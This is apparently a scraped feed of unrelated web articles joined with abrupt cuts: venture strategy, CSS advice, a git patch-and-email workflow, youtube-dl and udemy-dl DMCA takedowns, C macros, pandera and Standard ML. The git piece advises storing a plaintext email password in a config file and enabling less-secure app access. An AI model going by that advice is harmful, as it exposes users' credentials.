internal talent, spending significant time building internal consensus and overcoming bureaucracy, struggling to land exceptional entrepreneurial leaders who dream big and don’t want to work on a salary, and so on. These barriers and the lack of access to sufficient capital and talent often creates “zombie” ventures that are marketed externally as successful innovation (see Innovation Theater), but don’t ever scale to a point where senior corporate leaders acknowledge the venture as a meaningful contributor to corporate growth. In our experience, wholly-owned ventures allow the corporation to act like a “King” and call the shots, but are much less likely to make the corporation “Rich” than CVC investments.&nbsp;<br></p><p><strong>At High Alpha Innovation, we believe the best outcomes come when a corporation explicitly and thoughtfully makes the hard tradeoff between being Rich and being King. Not making a decision, or trying to maximize both, is counterintuitively why many CVC investments and internal ventures fail. Acknowledging this tradeoff and setting the right expectations within the corporation is half the battle.&nbsp;</strong><br></p><p>CVCs must ensure internal commercial owners understand and accept that they will be giving up a significant level of control and train them to treat CVC-backed startups more as strategic partners and less as vendors that they can push around. Innovation leaders who decide they’d prefer to be “King” and fully control a new internal venture must ensure corporate leaders understand and appreciate the capital, talent, and new incentive structures that will be required to scale the new venture over time into a financially meaningful business unit or subsidiary. This might involve convincing the corporation to set aside multi-year funding that the new venture can “unlock” when it hits predetermined milestones regardless of when the milestones are hit. This also might involve getting sign off for new financial incentive structures tied to performance of the new venture that enable key employees to share in the upside (e.g. Stock Appreciation Rights/Phantom Equity, or corporate grants/options tied to specific metrics). Regardless of the tool (CVC or new ventures), we think it’s vitally important for corporations to optimize for one and manage to the other.&nbsp;<br></p><p><strong>However, another good option has emerged recently that lies somewhere in between internal ventures and CVC investments: the majority-owned corporate-founded startup.&nbsp;</strong><br></p><p>We believe this novel approach, when executed well, can deliver financial returns closer to that of CVC investments while also giving corporations a bit more influence over the startup’s strategic direction and product roadmap. This is not about striving to be both Rich and King, it is about sharing some of the returns and some of the control. It’s an effective …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>

October 25, 2020 | https://tarunbatra.com/blog/x/git-before-github/ | <a href="https://web.archive.org/web/*/https://tarunbatra.com/blog/x/git-before-github/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>
<figure><figcaption><span>0001-Added-Tarun-Batra-to-contributors.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span>From 619814a3ac21012580e725136864e8397c14e20b Mon Sep 17 00:00:00 2001</span><br><span>From: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date: Tue, 20 Oct 2020 23:15:32 +0200</span><br><span>Subject: [PATCH] Added Tarun Batra to contributors</span><br><span></span><br><span></span><br><span> CONTRIBUTORS.txt | 1 +</span><br><span> 1 file changed, 1 insertion(+)</span><br><span></span><br><span>diff --git a/CONTRIBUTORS.txt b/CONTRIBUTORS.txt</span><br><span>index e69de29..1d12219 100644</span><br><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span></span><br><span><span>--</span></span><br><span>2.28.0</span><br></pre></td></tr></tbody></table></figure>
<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>
<figure><figcaption><span>git log</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>Author: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date:   Tue Oct 20 23:15:32 2020 +0200</span><br><span></span><br><span>    Added Tarun Batra to contributors</span><br><span></span><br><span>    Signed-off-by: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

<![CDATA[GitHub should stand up to the RIAA over YouTube-dl]]>

October 25, 2020 | https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/ | <a href="https://web.archive.org/web/*/https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this week, <a href="https://www.zdnet.com/article/riaa-blitz-takes-down-18-github-projects-used-for-downloading-youtube-videos/">GitHub took down the repository</a> for the youtube-dl project. This came in response to a request from the RIAA—the recording industry’s lobbying and harassment body. youtube-dl is a tool for downloading videos. The RIAA argued that this violates the anticircumvention protections of the Digital Millennium Copyright Act (DMCA). While GitHub taking down the repository and its forks is true to the principle of minimizing corporate risk, it’s the wrong choice.</p>



<p> Microsoft—currently the world’s second-most valuable company with a market capitalization of $1.64 trillion—owns GitHub. If anyone is in a position to fight back on this, it’s Microsoft. Microsoft’s lawyers should have a one word answer to the RIAA’s request: “no”. <em>(full disclosure: I own a small number of shares of Microsoft)</em></p>



<h2>The procedural argument</h2>



<p>The first reason to tell the RIAA where to stick it is procedural. The RIAA isn’t arguing that youtube-dl is infringing its copyrights or circumventing its protections. It is arguing that youtube-dl infringes YouTube’s protections. So even if it is, that’s YouTube’s problem, not the RIAA’s.</p>



<h2>The factual argument</h2>



<p>I have some sympathy for the anticircumvention argument. I’m not familiar with the specifics of how youtube-dl works, but it’s at least possible that youtube-dl circumvents YouTube’s copy protection. This would be a reasonable basis for YouTube to take action. Again, YouTube, not the RIAA.</p>



<p>I have less sympathy for the infringement argument. youtube-dl doesn’t induce infringement more than a web browser or screen recorder does. There are a variety of uses for youtube-dl that are not infringing. Foremost is the fact that some YouTube videos are under a license that explicitly allows sharing and remixing. Archivers use it to archive content. Some people who have time-variable Internet billing use it to download videos overnight.</p>



<p>So, yes, youtube-dl can be used to infringe the RIAA’s copyrights. It can also be used for non-infringing purposes. The code itself does not infringe. There’s nothing about it that gives the RIAA a justification to take it down.</p>



<h2>youtube-dl isn’t the whole story</h2>



<p>youtube-dl provides a focal point, but there’s more to it. Copyright law is now used to suppress instead of promote creative works. The DMCA, in particular, favors the large rightsholders over smaller developers and creators. It essentially forces sites to act on a “guilty until proven innocent” model. Companies in a position to push back have an obligation to do so. Microsoft has become a supporter of open source, now it’s time to show they mean it.</p>



<p>We should also consider the risks of consolidation. git is a decentralized system. GitHub has essentially centralized it. Sure, many competitors exist, but GitHub has become the default place to host open source code projects. The fact that GitHub’s code is proprietary is immaterial to this point. A FOSS service would pose the same risk if it became the centralized service.</p>



<p>I saw a quote on this discussion (which I can’t find now) that said “code is free, infrastructure is not.” And while projects self-hosting their code repository, issue tracker, etc may be philosophically appealing, that’s not realistic. Software-as-a-Service has lowered the barrier for starting projects, which is a good thing. But it doesn’t come without risk, which we are now seeing.</p>



<p>I don’t know what the right answer is for this. I know the answer won’t be easy. But both this specific case and the general issues they highlight are important for us to think about.</p>

            <p>This WebGL experiment is an attempt to create a procedural city that feels alive and is fun to watch.</p>
          
            <p>First, we generate a finite grid of random city blocks. Then, using some tricks, the viewpoint wraps around this grid, which creates the illusion of an endless cityscape.</p>

	<div>
		
<p>C is a fascinating programming language. For me, it is a particularly beautiful language, because it gives my blog the right to exist.</p>



<p>The C-standard is fine, but it falls short in many respects. It is a very non-committal standard and leaves a lot to the compiler itself. Large compilers such as gcc and clang have clear and useful specifications for this, which means that as a developer you rarely have any problems with this.</p>



<p>However, there are also things that cannot be solved for you by a clever compiler. That is something you really have to think about for yourself. One of those things: macros.</p>



<p>If you regularly work with C, you are used to macros. Especially if you sometimes look at larger C programmes. The larger a program becomes, the more essential a macro can become.</p>



<p>If you are not familiar with macros: this is how they can be used:</p>


<pre title="">#define macro(x)  foo(x); bar(x)
</pre>


<p>The consequence of this macro is that you can do this:</p>


<pre title="">macro(arg);
</pre>


<p>Which results in the following line:</p>


<pre title="">foo(arg); bar(arg);
</pre>


<p>So far, so good. From here on, however, things are only going downhill. Let’s look at another example:</p>


<pre title="">if (test)
    macro(arg);
</pre>


<p>This expands into:</p>


<pre title="">if (test)
    foo(arg);
bar(arg);
</pre>


<p>So now we have a problem. This macro does not behave as you would expect from a function. This is not so strange, because a macro is not a function. All it does is replace text with other text.</p>



<p>We can, of course, place curly braces around our functions to tackle this problem.</p>


<pre title="">#define macro(x)  { foo(x); bar(x); }
</pre>


<p>Now our problem has been solved! Look what is happening with our previous example!</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
</pre>


<p>However, there are also problems to be imagined in this respect. How about this?</p>


<pre title="">if (test)
    macro(arg);
else
    printf("This failed. :(");
</pre>


<p>This will result in the following code block:</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
else
    printf("This failed. :(");
</pre>


<p>Because of the <code>};</code> before <code>else</code>, this is no longer valid code.</p>



<p>So, how do we solve this? We need a way to ensure that everything after the macro identifier is correctly interpreted. Fortunately, there is a way to do that:</p>


<pre title="">#define macro(x) do { foo(x); bar(x); } while(0)
</pre>


<p>If we use this macro now in our previous example, we get:</p>


<pre title="">if (test)
    do {
        foo(arg); bar(arg);
    } while(0);
else
    printf("This failed. :(");
</pre>


<p>And with that we have found a solution.</p>

<p><code><span>pandera</span></code> provides a class-based API that’s heavily inspired by
<a href="https://pydantic-docs.helpmanual.io/">pydantic</a>. In contrast to the
<a href="https://pandera.readthedocs.io/en/stable/dataframe_schemas.html#dataframeschemas"><span>object-based API</span></a>, you can define schema models in
much the same way you’d define <code><span>pydantic</span></code> models.</p>
<p><cite>Schema Models</cite> are annotated with the <a href="https://pandera.readthedocs.io/en/stable/generated/pandera.typing.html#module-pandera.typing" title="pandera.typing"><code><span>pandera.typing</span></code></a> module using the standard
<a href="https://docs.python.org/3/library/typing.html">typing</a> syntax. Models can be
explictly converted to a <a href="https://pandera.readthedocs.io/en/stable/generated/pandera.schemas.DataFrameSchema.html#pandera.schemas.DataFrameSchema" title="pandera.schemas.DataFrameSchema"><code><span>DataFrameSchema</span></code></a> or used to validate a
<a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html#pandas.DataFrame" title="(in pandas v1.1.3)"><code><span>DataFrame</span></code></a> directly.</p>
<div>
<p>Note</p>
<p>Due to current limitations in the pandas library (see discussion
<a href="https://github.com/pandera-dev/pandera/issues/253#issuecomment-665338337">here</a>),
<code><span>pandera</span></code> annotations are only used for <strong>run-time</strong> validation and <strong>cannot</strong> be
leveraged by static-type checkers like <a href="http://mypy-lang.org/">mypy</a>. See the

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody">
    <p>The recent takedown of the <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">youtube-dl</a> project resurfaced memories of a similar project, udemy-dl, that I worked on years ago. I also had to abandon the project due to a DMCA notice. In light of what happened to youtube-dl this felt like the right time to write about it.</p>
<h2 id="beginnings">Beginnings</h2>
<p>Back in 2013 when I was starting off as a software consultant, I landed a project to build a desktop GUI application. I found a Udemy course for Python GUI development using Qt. After I started the course I ran into an obstacle. My internet was awful. It was slow (4 Mb/s, if I remember correctly) and disconnected frequently making streaming videos a painful experience.</p>
<p>A look at the network console in the browser made me realise I could throw together a quick scraper for the script.</p>
<p>And so I did. I wrote a Python script to fetch the course data and video URLs from the undocumented Udemy JSON API, and download the videos locally. Finally I could follow the videos in VLC at my leisure.</p>
<p>It was only some time later I realised that youtube-dl also supported downloading from Udemy. However, youtube-dl could only download a single video from one page at a time. udemy-dl could download and make a whole course offline, a big improvement.</p>
<p>I put my work online, with a name inspired by youtube-dl. I hosted the sources on <a href="https://github.com/gaganpreet/udemy-dl">Github</a> and packages on <a href="https://pypi.org/project/udemy-dl/">PyPi</a>. That was it. I never advertised udemy-dl or created a website (except for a readme on Github).</p>
<h2 id="gaining-momentum">Gaining momentum</h2>
<p>Turns out I wasn’t the only one who wanted to have an offline copy of their lectures. A year or so after the project was first published online, there was a gradual uptick in number of Github stars.</p>
<p>I also started receiving emails from users of the tool. Many looking for help with a particular issue and some thanking me for the project. I had stopped using the Udemy platform itself by this time since I wasn’t following any courses, and was only a maintainer.</p>
<h2 id="gaining-notoriety">Gaining notoriety</h2>
<p>I discovered that the tool was being used to provide unauthorized copies of courses. The tool was always meant for personal use, and unfortunately I had no control if users respected that.</p>
<p>I also learned of a loophole when someone made a feature request to add to the tool. Udemy offered a free 5 minute preview where all course content was accessible. This trial period could be used to download the course without having to pay.</p>
<p>This feature never made it to the project. Later I came across modified copies of the tool which did this: sign up for a course and quickly download the content within this short window.</p>
<p>In April 2015 I received a gently worded email from Udemy telling me that the project was being used for piracy and if I’d be willing to take down the tool altogether. I didn’t want to do that and I ignored the email. In retrospect, I could have replied and elaborated on my standpoint about why I wouldn’t do that. I doubt that would have helped at all.</p>
<p>I didn’t expect the project to go away. youtube-dl also existed, a much bigger project could also download Udemy videos. I presumed udemy-dl would always be around as long as youtube-dl.</p>
<h2 id="takedown">Takedown</h2>
<p>One fine day later in the summer of 2015, I woke up to a DMCA email from Github informing me of the takedown notice sent by Udemy. For a while afterwards I wanted to respond to the DMCA. The <a href="https://github.com/github/dmca/blob/master/2015/2015-08-12-Udemy.md">DMCA notice</a> centered around the point that the project I created, maintained and released to public domain was a property of Udemy, a completely wrong claim.</p>
<p>Unfortunately I had no idea where to start off with responding to a DMCA. My knowledge of American law, as an outsider was (and still is) nil. Due to other personal circumstances at the time and the fact that I was solely maintaining the project (and not using it), I gave up on the idea. The ownership of the project was forked/taken over by a former regular contributor (that fork was again taken down a few years later with a similar DMCA notice).</p>
<h2 id="why-it-matters">Why it matters</h2>
<p>udemy-dl served a great need for me and many others. Being able to watch videos and learn the way I wanted without having to be online or without opening a browser was the reason it existed and became popular. A platform which purpots to make education accessible, didn’t like a piece of code which served the same purpose.</p>
<p>youtube-dl was the latest victim. Apart from software projects, it’s not uncommon to have videos on Youtube taken down by the greedy claws of the music industry. So unfair that there exists a <a href="https://en.wikipedia.org/wiki/YouTube_copyright_issues">Wikipedia</a> page about the issue.</p>
<p>What has always troubled me is that a law as powerful as DMCA is used to intimidate all too often, with no easy recourse for the receiver. The law has provisions for unauthorized use, but good luck if you are an indie creator going up against a corporation.</p>
<p>youtube-dl is a huge loss because of the number of websites it supported, with many of the websites having unusable interfaces. I’m certain that youtube-dl will live on, but it’s on Github where it had a huge community which has now been scattered. And I hope we don’t lose this community forever.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <p>Incredibly, Standard ML implementations are still actively
developed. <a href="http://mlton.org/">MLton</a>, <a href="https://polyml.org/">Poly/ML</a>,
<a href="https://elsman.com/mlkit/">MLKit</a>,
<a href="https://www.pllab.riec.tohoku.ac.jp/smlsharp/">SML#</a> and
<a href="http://smlnj-gforge.cs.uchicago.edu/scm/viewvc.php/?root=smlnj">SML/NJ</a>
are the most prominent. Discussion on the future direction of Standard
ML <a href="https://github.com/SMLFamily/Successor-ML/issues">remains healthy as
well</a>.</p>
<p>And somehow OCaml's lesser known cousin still beats out OCaml for
multicore threading support (in Poly/ML).</p>
<p>While MLton hasn't merged with
<a href="https://github.com/kayceesrk/multiMLton">MultiMLton</a> or
<a href="https://github.com/UBMLtonGroup/RTMLton">RTMLton</a> to support
multicore, a <a href="https://github.com/mpllang/mpl">new fork of MLton with
parallelism</a> is pretty far along and
in active development at CMU.</p>
<p>
  A commentor shared
  <a href="https://github.com/ManticoreProject/manticore">Manticore</a>,
  another implementation with parallelism support in active
  development at UChicago.
